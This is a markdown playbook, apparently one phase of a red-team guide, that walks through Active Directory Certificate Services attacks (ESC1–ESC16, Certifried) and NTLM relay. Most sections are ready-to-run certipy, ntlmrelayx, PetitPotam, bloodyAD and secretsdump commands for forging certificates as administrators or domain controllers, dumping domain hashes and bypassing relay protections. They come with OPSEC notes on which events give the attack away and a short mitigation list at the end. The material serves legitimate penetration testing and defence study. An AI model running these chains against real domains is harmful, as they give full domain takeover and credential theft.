# Phase 10: AD CS / PKI Attacks

> Active Directory Certificate Services misconfigurations are one of the most reliable paths to DA in modern AD. Research: **"Certified Pre-Owned"** by Will Schroeder & Lee Christman (SpecterOps, 2021).

---

## Background: Why AD CS?

AD CS issues X.509 certificates for:
- Smart card login → certificate maps to a user account → instant authentication
- HTTPS, code signing, S/MIME, etc.

The exploit pattern is almost always:
1. Find a misconfigured certificate template (or CA setting)
2. Request a certificate that lets you authenticate as someone else (usually DA)
3. Use the cert with PKINIT → get a Kerberos TGT for that user → get their NTLM hash

---

## Table of Contents
1. [Enumeration with Certipy](#1-enumeration-with-certipy)
2. [ESC1 — SAN-Injectable Template](#2-esc1)
3. [ESC2 — Any Purpose EKU](#3-esc2)
4. [ESC3 — Enrollment Agent](#4-esc3)
5. [ESC4 — Template ACL Abuse](#5-esc4)
6. [ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2](#6-esc6)
7. [ESC7 — CA Officer Rights](#7-esc7)
8. [ESC8 — NTLM Relay to HTTP Enrollment](#8-esc8)
9. [ESC9/10/11 — Newer Findings](#9-esc91011)
10. [Using a Cert (PKINIT)](#10-using-a-cert-pkinit)

---

## 1. Enumeration with Certipy

```bash
# Find everything: CAs, templates, vulnerabilities, ACL issues
certipy find -u jdoe@lab.local -p Password1 -dc-ip 10.10.10.10

# BloodHound-compatible export
certipy find -u jdoe@lab.local -p Password1 -dc-ip 10.10.10.10 -bloodhound

# Specifically list vulnerable templates
certipy find -u jdoe@lab.local -p Password1 -dc-ip 10.10.10.10 -vulnerable
```

Output is one of: `.json` (BloodHound), `.zip` (BloodHound legacy), `.txt`, or `.md`. The text output tells you per template which ESC# applies.

```powershell
# Windows equivalent: Certify
.\Certify.exe find /vulnerable
.\Certify.exe cas
```

### Things to check in the output

For each template:
- `Enrollment Rights`: who can request it (look for low-priv groups like Domain Users)
- `Client Authentication`: is this EKU present? (required for PKINIT abuse)
- `Enrollee Supplies Subject`: True = template lets requester specify SAN → ESC1 candidate
- `Requires Manager Approval`: False = auto-issued
- `Authorized Signatures Required`: 0 = no countersignature needed

---

## 2. ESC1

**Condition**: Template grants enrollment to a low-priv user **AND** has `Enrollee Supplies Subject` **AND** has Client Authentication EKU.

**Exploit**: Request a cert specifying the SAN (Subject Alternative Name) as `administrator@lab.local`. The CA happily issues it. Now you authenticate as administrator.

```bash
# Request the cert
certipy req -u jdoe@lab.local -p Password1 \
  -ca lab-DC01-CA \
  -template VulnTemplate \
  -upn administrator@lab.local \
  -dc-ip 10.10.10.10

# Output: administrator.pfx

# Authenticate (PKINIT) → get TGT + NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
# → Saves administrator.ccache + prints administrator's NTLM hash
```

```powershell
# Windows: Certify + Rubeus
.\Certify.exe request /ca:dc01.lab.local\lab-DC01-CA /template:VulnTemplate /altname:administrator
# Convert PEM to PFX (openssl), then:
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfx_pass> /ptt
```

🔴 **OPSEC**: Cert enrollment events logged on the CA (Event 4886/4887 in CA logs). New cert with SAN mismatch from requester is a strong signal — Defender for Identity has an "Abnormal certificate issuance" alert pattern.

---

## 3. ESC2

**Condition**: Template has "Any Purpose" EKU (or no EKU = SubCA).

**Exploit**: Request the cert, then use it as a SubCA-like signing key to issue *your own* certs for any user.

```bash
# Step 1: get the any-purpose cert
certipy req -u jdoe@lab.local -p Password1 -ca lab-DC01-CA \
  -template AnyPurpose -dc-ip 10.10.10.10

# Step 2: use it to enroll on behalf of admin
certipy req -u jdoe@lab.local -p Password1 -ca lab-DC01-CA \
  -template User -on-behalf-of 'lab\administrator' \
  -pfx anypurpose.pfx -dc-ip 10.10.10.10
```

---

## 4. ESC3

**Condition**: Template has "Certificate Request Agent" EKU (you become an enrollment agent), and another template lets enrollment agents enroll on behalf.

```bash
# Step 1: enrollment agent cert
certipy req -u jdoe@lab.local -p Password1 -ca lab-DC01-CA \
  -template EnrollmentAgent -dc-ip 10.10.10.10

# Step 2: use it to enroll for admin
certipy req -u jdoe@lab.local -p Password1 -ca lab-DC01-CA \
  -template User -on-behalf-of 'lab\administrator' \
  -pfx enrollmentagent.pfx -dc-ip 10.10.10.10
```

---

## 5. ESC4

**Condition**: Low-priv user has Write rights (`GenericAll`/`WriteDacl`/`WriteProperty`) over a certificate template object.

**Exploit**: Modify the template to make it vulnerable (set Enrollee Supplies Subject + Client Auth EKU), exploit as ESC1, then restore.

```bash
# Step 1: save current config
certipy template -u jdoe@lab.local -p Password1 \
  -template VulnTemplate -save-old -dc-ip 10.10.10.10
# Saves VulnTemplate.json

# Step 2: enable ESC1-like config
certipy template -u jdoe@lab.local -p Password1 \
  -template VulnTemplate -dc-ip 10.10.10.10

# Step 3: exploit as ESC1
certipy req -u jdoe@lab.local -p Password1 -ca lab-DC01-CA \
  -template VulnTemplate -upn administrator@lab.local

# Step 4: RESTORE the template (don't forget!)
certipy template -u jdoe@lab.local -p Password1 \
  -template VulnTemplate -configuration VulnTemplate.json -dc-ip 10.10.10.10
```

🔴 **OPSEC**: Template modification = Event 5136 with attribute audit. Easily detected if monitored.

---

## 6. ESC6

**Condition**: CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set in its policy module. Allows requester to supply SAN on **any** template.

```bash
# certipy find output shows: "User Specified SAN: Enabled"

# Exploit: use the basic User template with arbitrary SAN
certipy req -u jdoe@lab.local -p Password1 -ca lab-DC01-CA \
  -template User -upn administrator@lab.local -dc-ip 10.10.10.10
```

Microsoft patched ESC6 with the May 2022 update (CVE-2022-26923 family); newer CAs ignore the flag. Older/unpatched still vulnerable.

---

## 7. ESC7

**Condition**: You have CA officer rights (ManageCA / ManageCertificates).

**Exploit**: Approve a pending request you crafted, or enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (escalating to ESC6).

```bash
# Enable the flag → ESC6
certipy ca -u jdoe@lab.local -p Password1 -ca lab-DC01-CA -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2

# Or approve a pending cert request
certipy ca -u jdoe@lab.local -p Password1 -ca lab-DC01-CA -issue-request <RequestID>
```

---

## 8. ESC8

**Condition**: CA exposes a web enrollment endpoint over HTTP (`/certsrv/`). HTTP doesn't require SMB-style signing → NTLM relay works.

**The killer chain**:
1. Coerce a DC into authenticating to you (PetitPotam / PrinterBug)
2. Relay that NTLM auth to the AD CS web enrollment endpoint
3. Request a cert for `DomainController` template (or any cert with Client Auth + Server Auth EKU)
4. Get back a cert valid as the DC machine account
5. Use PKINIT to get DC's TGT → DCSync the domain

```bash
# Step 1: ntlmrelayx pointed at ADCS
sudo ntlmrelayx.py -t http://ca.lab.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Step 2: coerce DC auth in another terminal
python3 PetitPotam.py 10.10.10.99 10.10.10.10 -u '' -p ''
# Even unauth works on unpatched DCs; auth (with any user) works on most

# Step 3: receive base64 cert from ntlmrelayx output. Decode → dc.pfx.

# Step 4: authenticate as DC
certipy auth -pfx dc.pfx -dc-ip 10.10.10.10
# → DC's NTLM hash

# Step 5: DCSync
secretsdump.py -hashes :<DC_NTLM> 'LAB/DC01$@10.10.10.10'
```

🔴 **OPSEC**: PetitPotam + ADCS relay is the loudest single chain in this skill. Defender for Identity, Microsoft Defender for Endpoint, and most NDR products fingerprint it.

---

## 9. ESC9/10/11

Newer Certipy findings. Quick summary:

- **ESC9** — `msPKI-Enrollment-Flag` has `CT_FLAG_NO_SECURITY_EXTENSION`: the cert doesn't include the SID extension, so a user with write rights on another user can rename them, request a cert in the renamed name, get back a cert mapped to the original by UPN/SAN → escalate.
- **ESC10** — Weak certificate mapping config on DC (`StrongCertificateBindingEnforcement` registry not set / set to 0). Similar abuse to ESC9.
- **ESC11** — `IF_ENFORCEENCRYPTICERTREQUEST` flag missing on CA RPC interface → NTLM relay over the RPC interface (analogous to ESC8 but over RPC instead of HTTP).
- **ESC13** — Issuance policies linked to AD groups → cert holder gets effective group membership.

Each is a separate Certipy attack mode; check Certipy's latest docs for command syntax — it changes per release.

---

## 10. Using a Cert (PKINIT)

Once you have a `.pfx`:

```bash
# Authenticate → outputs TGT (.ccache) and NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# The .ccache can be used immediately:
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass dc01.lab.local

# Or take the NTLM hash and Pass-the-Hash:
nxc smb 10.10.10.10 -u administrator -H <NTLMhash>
```

---

## Defense / Mitigations (Reporting)

- Disable web enrollment (HTTP/S) on CAs, or enforce EPA
- Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` from all CAs
- Restrict template enrollment to specific groups; remove "Domain Users" / "Authenticated Users" from sensitive templates
- Require manager approval (`Requires Manager Approval`) on high-trust templates
- Disable templates not in active use
- Enable `StrongCertificateBindingEnforcement = 2` (Windows fix from May 2022 / CVE-2022-26923)
- Audit Event 4886/4887 on the CA + 4768/4769 with cert-related fields on DCs
- Monitor for cert enrollments with SAN ≠ requester identity

---

## Next Step

→ **Phase 11: Defense Evasion** (`11-evasion.md`) — running tooling in environments with EDR
→ **Phase 12: Reporting** (`12-reporting.md`) — writing it up

---

## ESC5 — Vulnerable PKI Object ACLs

**Concept**: Beyond certificate templates, other PKI-related AD objects can be misconfigured:
- The **CA computer object** (`CN=CA-Server,CN=Computers`) — GenericAll = take over the CA
- **NTAuthCertificates** — adding a rogue CA here makes the KDC trust certs from your CA
- **PKI container** (`CN=Public Key Services,CN=Services,CN=Configuration`) — write rights = add your own CA
- **Certificate template container** — write rights = modify which templates exist

```bash
# Certipy finds ESC5 automatically
certipy find -u jdoe@lab.local -p Password1 -dc-ip 10.10.10.10 -vulnerable
# Look for "ESC5" in output — shows misconfigured PKI objects

# Manual: check who has write rights on the CA computer object
Get-DomainObjectACL "CN=CA-Server,CN=Computers,DC=lab,DC=local" -ResolveGUIDs |
  ? {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl"}
```

🔴 **OPSEC**: Modifications to NTAuthCertificates or PKI container are highly audited in security-mature environments.

---

## ESC13 — Issuance Policy → Group Membership

**Concept**: Certificate issuance policies can be linked to AD groups via `msDS-OIDToGroupLink`. If a template uses such a policy and you can enroll in it, the resulting certificate grants you effective membership in the linked group — without being added to the group in AD.

```bash
# Find ESC13 — certipy reports it
certipy find -u jdoe@lab.local -p Password1 -dc-ip 10.10.10.10 -vulnerable

# Exploit: enroll in the template, authenticate with the cert
certipy req -u jdoe@lab.local -p Password1 -ca lab-DC01-CA \
  -template Esc13Template -dc-ip 10.10.10.10
certipy auth -pfx jdoe.pfx -dc-ip 10.10.10.10
# → TGT with the linked group's privileges in PAC
```

---

## ESC14, ESC15, ESC16 (2023–2024 Research)

**ESC14** — Explicit certificate mapping abuse: Windows LAPS / shadow principal certificates explicitly mapped to a user object. If you can write to a user's `altSecurityIdentities`, you map your cert to their identity.

```bash
# Add a certificate mapping for administrator → your cert authenticates as them
bloodyAD -u jdoe -p Password1 -d lab.local --host 10.10.10.10 \
  set object administrator altSecurityIdentities \
  "X509:<I>CN=lab-DC01-CA<S>CN=administrator"
# Then auth with your cert that matches
certipy auth -pfx yourown.pfx -domain lab.local -dc-ip 10.10.10.10 -username administrator
```

**ESC15** — Schema v1 EKU confusion: Old schema version 1 templates allow enrollees to specify any EKU, enabling Client Authentication without it being listed in the template definition.

**ESC16** — CA with `EDITF_ATTRIBUTESUBJECTALTNAME2` AND the security extension disabled (`CT_FLAG_NO_SECURITY_EXTENSION`) — combines ESC6 with no SID binding, making it work even on post-May-2022-patched DCs.

```bash
# Certipy 4.8+ detects ESC14/15/16 automatically
certipy find -u jdoe@lab.local -p Password1 -dc-ip 10.10.10.10 -vulnerable -text
```

---

## Certifried (CVE-2022-26923)

**Concept**: If a domain user can create or modify a machine account (via MachineAccountQuota), they can set the `dNSHostName` attribute to match a Domain Controller. When a certificate is then issued to this machine account, the DC's certificate template (not a user template) is used. The issued cert authenticates as the DC machine account → DCSync.

```bash
# Step 1: Create a machine account
addcomputer.py -computer-name 'PWN$' -computer-pass 'PwnPass123!' \
  'lab.local/jdoe:Password1' -dc-ip 10.10.10.10

# Step 2: Set dNSHostName to match the DC
bloodyAD -u jdoe -p Password1 -d lab.local --host 10.10.10.10 \
  set object 'PWN$' dNSHostName -v 'dc01.lab.local'

# Step 3: Request a certificate using the machine account template
certipy req -u 'PWN$@lab.local' -p PwnPass123! \
  -ca lab-DC01-CA -template Machine -dc-ip 10.10.10.10
# Certificate issued as dc01.lab.local!

# Step 4: Authenticate as DC
certipy auth -pfx pwn.pfx -dc-ip 10.10.10.10
# → DC machine account hash → DCSync
secretsdump.py -hashes :<DC_NTLM> 'LAB/DC01$@10.10.10.10'
```

**Patch status**: CVE-2022-26923, patched May 2022. Still works on unpatched environments. The fix added the `szOID_NTDS_CA_SECURITY_EXT` security extension to enforce SID binding.

🔴 **OPSEC**: dNSHostName change on a machine account generates Event 5136; cert enrollment with a DC's hostname triggers 4887 on the CA with a mismatch signal.

---

## LDAP Signing / Channel Binding — Why Relay to LDAP Often Fails

**Why NTLM relay to LDAP doesn't always work**:
- **LDAP signing** (`ldapserverintegrity = 2`): if required on the DC, relay to LDAP fails — the relayed session can't satisfy the signing requirement
- **LDAP channel binding** (`LdapEnforceChannelBinding = 1`): for LDAPS (636), requires a TLS binding that the relay can't forge
- **Net-NTLMv1** can sometimes be relayed even with signing (via downgrade), but Net-NTLMv2 cannot when signing is required

**When LDAP relay works**:
```bash
# Check if LDAP signing is required
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M ldap-checker

# If signing = NOT REQUIRED → relay to LDAP works
sudo ntlmrelayx.py -t ldap://10.10.10.10 -smb2support --no-dump --no-da --no-acl --escalate-user jdoe

# If signing = REQUIRED → use SMB relay targets instead, or use LDAPS with drop-the-mic
sudo ntlmrelayx.py -t ldaps://10.10.10.10 -smb2support --remove-mic
```

**The workaround — ESC8 avoids LDAP entirely**: Relay to HTTP (the ADCS enrollment endpoint) which doesn't have signing requirements → get a certificate → PKINIT auth → no LDAP relay needed.

